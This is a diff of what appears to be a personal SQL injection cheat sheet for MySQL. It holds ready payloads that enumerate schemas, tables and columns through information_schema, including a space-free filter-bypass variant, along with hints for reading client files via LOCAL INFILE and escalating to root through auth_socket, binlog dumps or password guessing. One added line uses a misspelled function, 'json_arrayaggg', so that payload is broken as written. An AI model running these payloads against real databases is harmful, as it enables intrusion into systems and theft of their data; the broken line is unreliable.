@@ -28,9 +28,11 @@ no space: (select(group_concat(table_name))from(information_schema.tables)where(
 client-side arbitrary file inclusion LOCAL INFLE https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html
 become root via auth_socket, use different protocol to open files with COM_BINLOG_DUMP (need REPLICATION SLAVE privilege) or guess root pw with COM_CHANGE_USER command 
 
-# group_concat to get everything in one line and one column
+# get everything in one line and one column
 select group_concat(schema_name separator 0x2c) from information_schema.schemata;
-select group_concat(table_name,0x2e,column_name,0x0a) from information_schema.columns where table_schema='sqlilabs';
+select group_concat(table_name,0x2e,column_name,0x0a) from information_schema.columns where table_schema='blahdb';
+select group_concat(concat_ws(0x3a,table_schema,table_name)) from ..
+select json_arrayaggg(concat_ws(0x3a,table_schema,table_name)) from ..
 
 # injection in insert, update, delete statements
 http://dl.packetstormsecurity.net/papers/database/SQLi_Insert.pdf
